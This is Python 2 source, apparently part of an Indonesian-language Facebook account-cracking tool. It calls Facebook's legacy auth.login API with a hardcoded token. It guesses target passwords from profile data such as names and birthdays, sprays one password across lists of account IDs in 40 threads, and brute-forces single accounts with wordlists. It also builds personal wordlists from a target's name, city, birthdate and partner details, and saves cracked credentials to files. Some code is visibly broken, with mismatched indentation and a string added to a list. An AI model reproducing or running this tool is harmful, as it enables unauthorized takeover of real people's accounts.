            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mName\x1b[1;97m : ' + a['name']
            jalan('\x1b[1;91m[+] \x1b[1;92mChecking \x1b[1;97m...')
            time.sleep(1)
            jalan('\x1b[1;91m[+] \x1b[1;92mOpen security \x1b[1;97m...')
            time.sleep(1)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            pz1 = a['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = json.load(data)
            if 'access_token' in y:
                print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                menu()
            else:
                if 'www.facebook.com' in y['error_msg']:
                    print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                    print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                    menu()
                else:
                    pz2 = a['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = json.load(data)
                    if 'access_token' in y:
                        print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                        menu()
                    else:
                        if 'www.facebook.com' in y['error_msg']:
                            print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                            menu()
                        else:
                            pz3 = a['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = json.load(data)
                            if 'access_token' in y:
                                print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                menu()
                            else:
                                if 'www.facebook.com' in y['error_msg']:
                                    print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                    print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                    menu()
                                else:
                                        pz4 = a['last_name'] + '12345'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = json.load(data)
                            if 'access_token' in y:
                                print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                menu_()
                            else:
                                if 'www.facebook.com' in y['error_msg']:
                                    print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                    print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                    menu()
                                else:
                                        lahir = a['birthday']
                                        pz5 = lahir.replace('/', '')
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        y = json.load(data)
                                        if 'access_token' in y:
                                            print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz5
                                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                            menu_()
                                        else:
                                            if 'www.facebook.com' in y['error_msg']:
                                                print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                                print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz5
                                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                                menu()
                                            else:
                                                    pz6 = a['first_name'] + ['last_name']
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    y = json.load(data)
                                                    if 'access_token' in y:
                                                        print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz6
                                                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                                        menu()
                                                    else:
                                                        if 'www.facebook.com' in y['error_msg']:
                                                            print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                                                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz6
                                                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                                            menu()
                                                        else:
                                                        	    lahir = a['birthday']
                                                                pz7 = a['first_name'] + lahir.replace('/', '')
                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                y = json.load(data)
                                                                if 'access_token' in y:
                                                                    print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                                                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz7
                                                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                                                    menu()
                                                                else:
                                                                    if 'www.facebook.com' in y['error_msg']:
                                                                        print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                                                        print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                                                                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz7
                                                                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                                                        menu()
                                                                    else:
                                                                        	lahir = a['birthday']
                                                                            pz8 = a['last_name'] + lahir.replace('/', '')
                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                            y = json.load(data)
                                                                            if 'access_token' in y:
                                                                                print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                                                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                                                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                                                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz8
                                                                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                                                                menu()
                                                                            else:
                                                                                if 'www.facebook.com' in y['error_msg']:
                                                                                    print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                                                                    print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                                                                                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                                                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                                                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz8
                                                                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                                                                    menu()
                                                                                else:
                                                                                        pz9 = ('sayang')
                                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                        y = json.load(data)
                                                                                        if 'access_token' in y:
                                                                                            print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                                                                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                                                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                                                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz9
                                                                                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                                                                            menu()
                                                                                        else:
                                                                                            if 'www.facebook.com' in y['error_msg']:
                                                                                                print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                                                                                print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                                                                                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                                                                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                                                                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz9
                                                                                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                                                                                menu()
                                                                                            else:
                                                                                                 print '\x1b[1;91m[!] Sorry, opening password target failed :('
                                                                                                 print '\x1b[1;91m[!] Try other method.'
                                                                                                 raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                                                                                 menu()
        except KeyError:
            print '\x1b[1;91m[!] Target not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()


def crack():
    global file
    global idlist
    global passw
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
        passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m: \x1b[1;97m')
        try:
            file = open(idlist, 'r')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            for x in range(40):
                zedd = threading.Thread(target=scrak, args=())
                zedd.start()
                threads.append(zedd)

            for zedd in threads:
                zedd.join()

        except IOError:
            print '\x1b[1;91m[!] File not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()


def scrak():
    global back
    global berhasil
    global cekpoint
    global gagal
    global up
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('Berhasil.txt', 'w')
                bisa.write(username + ' | ' + passw + '\n')
                bisa.close()
                berhasil.append('\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + username + ' | ' + passw)
                back += 1
            else:
                if 'www.facebook.com' in mpsh['error_msg']:
                    cek = open('Cekpoint.txt', 'w')
                    cek.write(username + ' | ' + passw + '\n')
                    cek.close()
                    cekpoint.append('\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + username + ' | ' + passw)
                    back += 1
                else:
                    gagal.append(username)
                    back += 1
            sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack    \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive\x1b[1;91m:\x1b[1;96m' + str(len(berhasil)) + ' \x1b[1;97m=>\x1b[1;93mCheck\x1b[1;91m:\x1b[1;96m' + str(len(cekpoint)))
            sys.stdout.flush()

    except IOError:
        print '\n\x1b[1;91m[!] Connection busy'
        time.sleep(0.01)
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] No connection'


def hasil():
    print
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    for b in berhasil:
        print b

    for c in cekpoint:
        print c

    print
    print '\x1b[31m[x] Failed \x1b[1;97m--> ' + str(len(gagal))
    keluar()


def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '╔' + 52 * '\x1b[1;97m\xe2\x95\x90'
        try:
            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail\x1b[1;97m/\x1b[1;92mHp \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                            print 52 * '\x1b[1;97m\xe2\x95\x90'
                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print '\n\x1b[1;91m[!] \x1b[1;92mIt looks like you dont have wordlist'
            tanyaw()


def tanyaw():
    why = raw_input('\x1b[1;91m[?] \x1b[1;92mYou want to make wordlist ? \x1b[1;92m[y/n\x1b[1;91m:\x1b[1;97m ')
    if why == '':
        print '\x1b[1;91m[!] Please choose \x1b[1;97m(y/n)'
        tanyaw()
    else:
        if why == 'y':
            wordlist()
        else:
            if why == 'Y':
                wordlist()
            else:
                if why == 'n':
                    menu()
                else:
                    if why == 'N':
                        menu()
                    else:
                        print '\x1b[1;91m[!] Please choose \x1b[1;97m(y/n)'
                        tanyaw()


def wordlist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[?] \x1b[1;92mIsi data lengkap target dibawah'
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            a = raw_input('\x1b[1;91m[+] \x1b[1;92mName Depan \x1b[1;97m: ')
            file = open(a + '.txt', 'w')
            b = raw_input('\x1b[1;91m[+] \x1b[1;92mName Belakang \x1b[1;97m: ')
            c = raw_input('\x1b[1;91m[+] \x1b[1;92mKota \x1b[1;97m: ')
            d = raw_input('\x1b[1;91m[+] \x1b[1;92mName Panggilan \x1b[1;97m: ')
            e = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
            f = e[0:2]
            g = e[2:4]
            h = e[4:]
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[?] \x1b[1;93mKalo Jomblo SKIP aja :v'
            i = raw_input('\x1b[1;91m[+] \x1b[1;92mName Pacar \x1b[1;97m: ')
            j = raw_input('\x1b[1;91m[+] \x1b[1;92mName Panggilan Pacar \x1b[1;97m: ')
            k = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Jadian Pacar >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            l = k[0:2]
            m = k[2:4]
            n = k[4:]
            file.write('%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s' % (a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k))
            wg = 0
            while wg < 100:
                wg = wg + 1
                file.write(a + str(wg) + '\n')

            en = 0
            while en < 100:
                en = en + 1
                file.write(i + str(en) + '\n')

            word = 0
            while word < 100:
                word = word + 1
                file.write(d + str(word) + '\n')

            gen = 0
            while gen < 100:
                gen = gen + 1
                file.write(j + str(gen) + '\n')

            file.close()
            time.sleep(1.5)
            print '\n\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m: \x1b[1;97m %s.txt' % a
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except IOError as e:
            print '\x1b[1;91m[!] Make file failed'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        else:
            print '\x1b[1;91m[!] Error'
            keluar()


if __name__ == '__main__':
	login()

